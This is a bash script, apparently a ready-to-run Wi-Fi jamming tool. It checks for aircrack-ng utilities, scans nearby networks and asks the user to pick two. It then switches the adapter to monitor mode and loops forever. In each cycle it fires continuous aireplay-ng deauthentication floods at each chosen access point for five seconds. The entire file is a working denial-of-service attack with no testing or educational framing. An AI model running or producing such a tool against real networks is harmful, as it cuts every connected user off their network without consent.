#!/bin/bash

check_requirements(){
  check_program() {
      if command -v $1 &> /dev/null
      then
          echo -e "$1 \e[32m✓\e[0m"
          return 0
      else
          echo -e "$1 \e[31m✗\e[0m"
          return 1
      fi
  }

  programs=("iwconfig" "airmon-ng" "iwlist" "aireplay-ng")
  not_installed=0

  echo "Check required programs:"

  for program in "${programs[@]}"
  do
      if ! check_program $program
      then
          not_installed=$((not_installed + 1))
      fi
  done

  if [ $not_installed -gt 0 ]
  
  then
      echo ""
      echo -e "\e[31mError: $not_installed program(s) not installed.\e[0m"
      echo "Please install the missing programs and try again."
      exit 1
  else
      echo ""
      echo -e "\e[32mAll required programs are installed.\e[0m"
      echo "The script can be continued"
      echo ""
  fi
}


display_ascii_art() {
  echo "  (    (          "
  echo "  )\ ) )\ )   (   "
  echo "( ()/((()/( ( )\  "
  echo "  /(_))/(_)))((_) "
  echo "( _))_(_))_((_)_  "
  echo "|  |_  |   \| _ ) "
  echo "|  __| | |) | _ \ "
  echo "| _|   |___/|___/ "
  echo ""
  sleep 2
}

select_wifi_adapter() {
  echo "Available WiFi adapters:"
  iwconfig 2>&1 | grep 'IEEE' | awk '{print NR". "$1}'
  
  while true; do
    read -p "Select an adapter (enter number): " choice
    adapter=$(iwconfig 2>&1 | grep 'IEEE' | awk -v choice=$choice 'NR==choice {print $1}')
    if [ -n "$adapter" ]; then
      echo ""
      echo "You have selected the adapter $adapter."
      break
    else
      echo "\nInvalid selection. Please try again."
    fi
  done
}

select_networks() {
  echo "Scan for available networks..."
  echo "Index | ESSID | BSSID | Channel | Frequency"
  echo "----------------------------------------------"
  network_list=$(sudo iwlist $adapter scan | awk '
    BEGIN { OFS="|"; i=1 }
    /Cell/{ if (essid != "") print i++, essid, bssid, channel, frequency; essid = bssid = channel = frequency = "" }
    /ESSID:/ {
      essid = substr($0, index($0,":")+1)
      gsub(/^[ \t]+|[ \t]+$/, "", essid)  # Trim leading/trailing whitespace
      gsub(/^"|"$/, "", essid)  # Remove quotation marks
    }
    /Address:/{ bssid = $5 }
    /Channel:/{ channel = substr($1, index($1,":")+1) }
    /Frequency:/{ frequency = substr($1, index($1,":")+1) }
    END{ if (essid != "") print i++, essid, bssid, channel, frequency }
  ')
  echo "$network_list" | column -t -s "|"
  
  for selection in 1 2; do
    while true; do
      read -p "Select Network $selection (enter number):  " network_choice
      selected_network=$(echo "$network_list" | awk -v choice=$network_choice -F'|' '$1 == choice {print $0; exit}')
      if [ -n "$selected_network" ]; then
        OLD_IFS="$IFS"
        IFS='|'
        set -- $selected_network
        selected_index="$1"
        selected_essid="$2"
        selected_bssid="$3"
        selected_channel="$4"
        selected_frequency="$5"
        IFS="$OLD_IFS"
        echo "\nYou have selected the $selection network with the following details:"
        echo "Index: $selected_index"
        echo "ESSID: $selected_essid"
        echo "BSSID: $selected_bssid"
        echo "Channel: $selected_channel"
        echo "Frequency: $selected_frequency"
        echo ""
        
        if [ $selection -eq 1 ]; then
          network1_bssid="$selected_bssid"
          network1_channel="$selected_channel"
        else
          network2_bssid="$selected_bssid"
          network2_channel="$selected_channel"
        fi
        
        break
      else
        echo "\nInvalid selection. Please try again."
      fi
    done
  done
}

check_requirements
display_ascii_art
select_wifi_adapter
select_networks

sudo iwconfig $adapter power off
sudo airmon-ng start $adapter

while true; do
  sudo iwconfig ${adapter}mon channel $network1_channel
  sudo aireplay-ng --deauth 0 -a $network1_bssid ${adapter}mon &
  AIREPLAY_PID=$!
  sleep 5

  sudo kill $AIREPLAY_PID

  sudo iwconfig ${adapter}mon channel $network2_channel
  sudo aireplay-ng --deauth 0 -a $network2_bssid ${adapter}mon &
  AIREPLAY_PID=$!
  sleep 5

  sudo kill $AIREPLAY_PID
done